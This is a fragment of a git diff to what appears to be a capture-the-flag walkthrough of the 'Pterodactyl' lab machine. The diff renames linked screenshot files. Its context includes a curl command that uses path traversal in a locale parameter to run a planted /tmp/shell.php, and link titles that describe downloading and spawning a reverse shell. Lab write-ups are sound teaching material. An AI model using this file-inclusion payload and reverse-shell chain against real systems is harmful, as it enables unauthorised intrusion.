@@ -126,7 +126,7 @@ We call the newly created `/tmp/shell.php` via the LFI to execute the `curl` com
 curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell"
 ```
 
-[Curl -> Donwload Hit at Python server](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/Download_rev_sh.txt "Curl -> Donwload Hit at Python server")
+[Curl -> Donwload Hit at Python server](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/donwloadshellonvictim.txt "Curl -> Donwload Hit at Python server")
 
 ### Execution
 
@@ -141,9 +141,9 @@ curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp
 
 ```
 
-[Execution Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/executor.txt  "Execution Results")
+[Execution Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/overwrite_trigger.txt  "Execution Results")
 
-[Shell Spawned](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/pop_Shell.txt "Shell Spawned")
+[Shell Spawned](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/execute_revsehll.txt "Shell Spawned")
 
 
 ```Python
